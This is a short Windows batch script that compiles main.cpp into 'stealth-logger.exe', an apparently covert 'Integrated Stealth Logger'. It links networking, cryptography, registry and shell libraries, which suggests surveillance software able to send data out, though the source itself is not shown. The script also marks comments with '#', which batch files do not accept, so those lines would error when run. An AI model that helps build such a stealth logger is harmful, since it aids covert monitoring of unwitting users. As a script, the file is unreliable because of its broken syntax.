@echo off
setlocal enabledelayedexpansion

echo Building Integrated Stealth Logger...

# Set compiler options
set CC=cl
set CFLAGS=/EHsc /O2 /W4 /D_CRT_SECURE_NO_WARNINGS /D_WIN32_WINNT=0x0601
set LDFLAGS=kernel32.lib user32.lib advapi32.lib ws2_32.lib crypt32.lib shell32.lib

# Compile all source files
%CC% %CFLAGS% main.cpp %LDFLAGS% /Fe:stealth-logger.exe

if %errorlevel% equ 0 (
    echo Build successful! Output: stealth-logger.exe
    echo Cleaning up...
    del *.obj *.ilk *.pdb
) else (
    echo Build failed with error level %errorlevel%
)

endlocal
pause
